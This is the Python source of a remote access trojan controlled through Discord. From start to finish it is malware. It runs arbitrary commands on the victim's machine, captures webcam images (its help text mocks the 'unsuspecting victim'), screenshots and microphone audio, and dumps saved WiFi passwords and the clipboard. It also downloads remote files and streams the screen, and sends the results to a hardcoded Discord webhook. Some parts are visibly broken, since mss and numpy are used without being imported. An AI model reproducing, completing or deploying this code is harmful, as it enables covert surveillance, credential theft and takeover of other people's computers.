import os
import time
import subprocess
import pyautogui
import datetime
import discord
from discord_webhook import DiscordWebhook
import wmi
import requests
import cv2
import pynput
import webbrowser
import sounddevice as sd
from scipy.io.wavfile import write
from discord.ext import commands
from pynput.keyboard import Controller, Key
import pyperclip

# Initialize global variables
TOKEN = ""
WEBHOOK_URL = "https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF"
USER_ID1 = '1176835313356767312'
USER_ID2 = ''

# Initialize keyboard controller and modifier keys
keyboard = Controller()
MODIFIERS = {
    "ctrl": Key.ctrl_l,
    "shift": Key.shift,
    "alt": Key.alt_l,
    "win": Key.cmd,
    "esc": Key.esc,
    "space": Key.space,
    "enter": Key.enter,
    "tab": Key.tab,
    "backspace": Key.backspace,
    "delete": Key.delete,
    "up": Key.up,
    "down": Key.down,
    "left": Key.left,
    "right": Key.right,
    "f1": Key.f1,
    "f2": Key.f2,
    "f3": Key.f3,
    "f4": Key.f4,
    "f5": Key.f5,
    "f6": Key.f6,
    "f7": Key.f7,
    "f8": Key.f8,
    "f9": Key.f9,
    "f10": Key.f10,
    "f11": Key.f11,
    "f12": Key.f12
}

# Set up Discord client
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')

@client.event
async def on_message(message):
    if message.author == client.user or message.webhook_id:
        return

    if message.author.id == int(USER_ID1) or message.author.id == (USER_ID2):
        if message.content.startswith('command'):
            await handle_command(message)
        elif message.content.startswith('cam'):
            await handle_camera(message)
        elif message.content.startswith('com'):
            await handle_system_command(message)
        elif message.content.startswith('lock'):
            await handle_lock(message)
        elif message.content.startswith('screenshot'):
            await handle_screenshot(message)
        elif message.content.startswith('wifi'):
            await handle_wifi(message)
        elif message.content.startswith('download'):
            await handle_download(message)
        elif message.content.startswith('sys'):
            await handle_system_info(message)
        elif message.content.startswith('play'):
            await handle_play(message)
        elif message.content.startswith('web'):
            await handle_web(message)
        elif message.content.startswith('record'):
            await handle_record(message)
        elif message.content.startswith('help'):
            await handle_help(message)
        elif message.content.startswith('type'):
            await handle_typing(message)
        elif message.content.startswith('copy'):
            await handel_clipboard_copy(message)
        elif message.content.startswith('clipboard'):
            await handel_clipboard_get(message)
        elif message.content.startswith('ip'):
            await handel_get_ip(message)
        elif message.content.startswith('stream'):
            await handel_stream_twitch(message)
    else:
        await message.channel.send("You are not authorized to use this bot.")

async def handle_command(message):
    command = message.content.replace('command ', '')
    result = subprocess.run(command, capture_output=True, text=True)
    output = result.stdout.replace('Ã', '├').replace('Ä', '─')
    chunk_length = 2000
    chunks = [output[i:i+chunk_length] for i in range(0, len(output), chunk_length)]
    for chunk in chunks:
        webhook = DiscordWebhook(url=WEBHOOK_URL, content=chunk)
        webhook.execute()

async def handle_camera(message):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await message.channel.send("Error: Could not open camera.")
        return
    ret, frame = cap.read()
    if not ret:
        await message.channel.send("Error: Failed to capture frame.")
    else:
        cv2.imwrite("pic.jpg", frame)
        webhook = DiscordWebhook(url=WEBHOOK_URL, content="Captured image.")
        with open("pic.jpg", "rb") as f:
            webhook.add_file(file=f.read(), filename="pic.jpg")
        webhook.execute()
        os.remove("pic.jpg")
    cap.release()

async def handle_system_command(message):
    command = message.content.replace('com ', '')
    os.system(command)

async def handle_lock(message):
    duration = int(message.content.replace('lock ', ''))
    await message.channel.send(f'Locking for {duration} seconds...')
    mouse_listener = pynput.mouse.Listener(suppress=True)
    keyboard_listener = pynput.keyboard.Listener(suppress=True)
    mouse_listener.start()
    keyboard_listener.start()
    time.sleep(duration)
    mouse_listener.stop()
    keyboard_listener.stop()
    await message.channel.send('Unlocked!')

async def handle_screenshot(message):
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    webhook = DiscordWebhook(url=WEBHOOK_URL, content="Screenshot taken.")
    with open("screenshot.png", "rb") as f:
        webhook.add_file(file=f.read(), filename="screenshot.png")
    webhook.execute()
    os.remove("screenshot.png")

async def handle_wifi(message):
    networks, out = [], ''
    wifis = []

    try:
        wifi = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'], shell=True,
            stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
        wifi = [i.split(":")[1][1:-1]
                for i in wifi if "All User Profile" in i]
        wifis = len(networks)

        for name in wifi:
            try:
                results = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                    stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                results = [b.split(":")[1][1:-1]
                            for b in results if "Key Content" in b]
                
            except subprocess.CalledProcessError:
                networks.append((name, ''))
                continue

            try:
                networks.append((name, results[0]))
            except IndexError:
                networks.append((name, ''))

    except subprocess.CalledProcessError:
        pass
    except UnicodeDecodeError:
        pass

    out += f'{"SSID":<20}| {"PASSWORD":<}\n'
    out += f'{"-"*20}|{"-"*29}\n'
    for name, password in networks:
        out += '{:<20}| {:<}\n'.format(name, password)
    await(message.channel.send(f"```{out}```"))

async def handle_download(message):
    _, url, filename = message.content.split()
    response = requests.get(url)
    with open(filename, 'wb') as f:
        f.write(response.content)
    await message.channel.send(f"File downloaded as {filename}")

async def handle_system_info(message):
    cpu = wmi.WMI().Win32_Processor()[0].Name
    gpu = wmi.WMI().Win32_VideoController()[0].Name
    ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
    webhook = DiscordWebhook(url=WEBHOOK_URL, content=f"CPU: {cpu}\nGPU: {gpu}\nRAM: {ram} GB")
    webhook.execute()

async def handle_play(message):
    _, url, duration = message.content.split()
    duration = int(duration)
    response = requests.get(url)
    with open('sound.m4a', 'wb') as f:
        f.write(response.content)
    os.system('sound.m4a')
    time.sleep(duration)
    os.remove('sound.m4a')

async def handle_web(message):
    site = message.content.replace('web ', '')
    webbrowser.open(f"http://{site}")
    await message.channel.send(f"Opened website: {site}")

async def handle_record(message):
    duration = int(message.content.replace('record ', ''))
    fs = 44100
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    write('recording.wav', fs, recording)
    webhook = DiscordWebhook(url=WEBHOOK_URL, content=f"Recorded audio for {duration} seconds.")
    with open("recording.wav", "rb") as f:
        webhook.add_file(file=f.read(), filename="recording.wav")
    webhook.execute()
    os.remove("recording.wav")

async def handle_help(message):
    embed = discord.Embed(title="Commands", description="Available commands:", color=0x00ff00)
    commands = [
    ("help", "shows a list of all commands"),
    ("command <command>", "send a command in the target computer and receive the output"),
    ("com <command>", "send a command in the target computer without receiving the output"),
    ("cam", "take a picture of the unsuspecting victim :)"),
    ("lock <time>", "locks the target's keyboard and mouse for the specified amount of time"),
    ("screenshot", "sends you a screenshot of the target computer"),
    ("wifi", "gives you a list of all saved WiFi passwords on the target device"),
    ("download <url> <file_name>", "downloads the file at the URL into the target computer"),
    ("sys", "gives you the specs of the target computer"),
    ("play <url> <time_to_close_player>", "play an audio file provided in the link on the target computer"),
    ("web <url>", "opens the URL in the target computer's browser"),
    ("record <time>", "records an audio file on the target computer and sends it to you"),
    ("type <text>", "types the text on the target computer, use '[]' for key combinations"),
    ("copy <text>", "copies the text to the clipboard"),
    ("clipboard", "gets the text from the clipboard"),
    ("ip", "gets the IP address of the target computer"),
    ("stream <stream_key>", "streams the target computer's screen to Twitch")
]
    for name, desc in commands:
        embed.add_field(name=name, value=desc, inline=False)
    await message.channel.send(embed=embed)

async def handle_typing(message):
    text = message.content.replace('type ', '')
    for char in text:
        if char == "[":
            end = text.find("]", text.index(char))
            modifier = text[text.index(char) + 1:end].lower()
            if modifier in MODIFIERS:
                keyboard.press(MODIFIERS[modifier])
                keyboard.release(MODIFIERS[modifier])
            text = text[end + 1:]
        else:
            keyboard.type(char)
async def handel_clipboard_copy(message):
    text = message.content.replace('copy ', '')
    pyperclip.copy(text)

async def handel_clipboard_get(message):
    text = message.content.replace('paste ', '')
    await message.channel.send(pyperclip.waitForPaste())

async def handel_get_ip(message):
    ip = requests.get('https://api.ipify.org?format=json').text
    await message.channel.send(f'IP(v4): {ip}')
    ip = requests.get('https://api64.ipify.org?format=json').text
    await message.channel.send(f'IP(v6): {ip}')
    
    
async def handel_stream_twitch(message):
    stream_key = message.content.replace('stream ', '')
    await message.channel.send(f'Streaming...')
    TWITCH_URL = "rtmp://live.twitch.tv/app/"
    STREAM_KEY = stream_key  # Replace with your Twitch Stream Key

    # FFmpeg command to stream
    ffmpeg_cmd = [
        "ffmpeg",
        "-y",  # Overwrite output files
        "-f", "rawvideo",  # Input format
        "-vcodec", "rawvideo",
        "-pix_fmt", "bgr24",  # Pixel format
        "-s", "1280x720",  # Frame size
        "-r", "30",  # Frame rate
        "-i", "-",  # Input comes from stdin
        "-c:v", "libx264",  # Encode in H.264
        "-pix_fmt", "yuv420p",  # Pixel format for output
        "-preset", "veryfast",  # Encoding speed/quality trade-off
        "-f", "flv",  # Output format
        TWITCH_URL + STREAM_KEY
    ]

    # Start FFmpeg process
    process = subprocess.Popen(ffmpeg_cmd, stdin=subprocess.PIPE)

    # Initialize screen capture using mss
    with mss.mss() as sct:
        # Define the monitor to capture (primary monitor)
        monitor = sct.monitors[1]  # You can change this to sct.monitors[x] if needed

        try:
            while True:
                # Capture the screen
                screenshot = sct.grab(monitor)

                # Convert the raw screenshot to a NumPy array
                frame = np.array(screenshot)

                # Convert BGRA to BGR (drop alpha channel)
                frame = frame[:, :, :3]

                # Resize to 1920x1080
                frame = cv2.resize(frame, (1280, 720))

                # Write frame to FFmpeg process
                process.stdin.write(frame.tobytes())

        except KeyboardInterrupt:
            print("Streaming stopped by user.")

        finally:
            # Cleanup
            process.stdin.close()
            process.wait()
# Start the bot
client.run(TOKEN)
